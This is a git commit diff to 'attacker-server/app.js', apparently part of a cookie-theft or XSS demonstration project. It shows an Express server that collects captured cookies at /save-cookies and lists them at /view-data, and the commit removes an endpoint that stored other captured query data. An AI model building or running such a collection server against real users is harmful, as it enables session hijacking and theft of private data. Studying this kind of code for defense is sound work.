d48b2198dec13fb0c613cca9e01607887618596f
githiago-f <tfarias@protonmail.com>
2023-04-07 16:02:48 -0300

    remove save other information option - not used

--- attacker-server/app.js
+++ attacker-server/app.js
@@ -2,13 +2,11 @@ import express from 'express';
 import cookieParser from "cookie-parser";
 import cors from 'cors';
 import {createLogger} from "bunyan";
-import qs from 'qs';
 
 const logger = createLogger({ name: 'attacker-service' });
 
 const app = express();
 const capturedCookies = new Set();
-const capturedOtherData = [];
 
 app.use(cors());
 app.use(express.json());
@@ -19,7 +17,7 @@ app.disable('x-powered-by');
 
 app.get('/view-data', (req, res) => {
   const dataAsArray = Array(...capturedCookies);
-  res.json({ capturedCookies: dataAsArray, capturedOtherData });
+  res.json({ capturedCookies: dataAsArray });
 });
 
 app.get('/save-cookies', (req, res) => {
@@ -29,12 +27,6 @@ app.get('/save-cookies', (req, res) => {
   res.end();
 });
 
-app.get('/save-other', (req, res) => {
-  const parsed = qs.parse(req.query);
-  logger.info(parsed);
-  capturedOtherData.push(parsed);
-  res.end();
-});
 
 app.listen(8081, '0.0.0.0', () => {
   logger.info('Attacker listening at address http://localhost:8081');
